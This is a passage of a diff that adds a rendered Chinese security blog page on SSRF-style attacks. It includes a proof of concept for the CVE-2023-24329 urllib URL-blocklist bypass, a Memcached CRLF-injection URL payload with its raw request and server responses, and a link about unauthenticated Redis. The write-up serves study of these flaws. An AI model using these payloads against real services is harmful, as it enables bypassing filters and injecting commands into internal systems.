+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>exp：<a target="_blank" rel="noopener" href="https://github.com/JawadPy/CVE-2023-24329-Exploit/tree/main">https://github.com/JawadPy/CVE-2023-24329-Exploit/tree/main</a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Python version: before 3.11.4</span>
+<span class="token comment"># CVE-2023-24329</span>
+
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
+
+blocked_list <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">"http://example.com/"</span><span class="token punctuation">,</span>
+    <span class="token string">"http://example2.com/"</span>
+<span class="token punctuation">]</span>
+<span class="token keyword">def</span> <span class="token function">is_url_blocked</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    parse <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>geturl<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span>  parse <span class="token keyword">in</span> blocked_list<span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'URL Blocked'</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'Bypassed'</span>
+ 
+payload1 <span class="token operator">=</span> <span class="token string">"    http://example.com/"</span>
+payload2 <span class="token operator">=</span> <span class="token string">"http://example.com/"</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>
+    is_url_blocked<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token string">"\n"</span><span class="token punctuation">,</span>
+    is_url_blocked<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><p>参考：<a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/106">https://security.tencent.com/index.php/blog/msg/106</a></p>
+<hr>
+<h2 id="Memcached未授权"><a href="#Memcached未授权" class="headerlink" title="Memcached未授权"></a>Memcached未授权</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1%0d%0aset%20foo%200%200%205%0d%0aABCDE%0d%0a:11211/foo</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>报文如下：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/foo</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.4</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
+set foo 0 0 5
+ABCDE
+:11211<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当检查下面几行memcached的协议语法的时候，大部分都是语法错误，但是memcached在收到错误的命令的时候并不会关闭连接，这样攻击者就可以在请求的任何位置注入命令了，然后memcached就会执行</p>
+<p>下面是响应：</p>
+<pre class="line-numbers language-none"><code class="language-none">ERROR
+ERROR
+ERROR
+ERROR
+ERROR
+STORED
+ERROR
+ERROR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
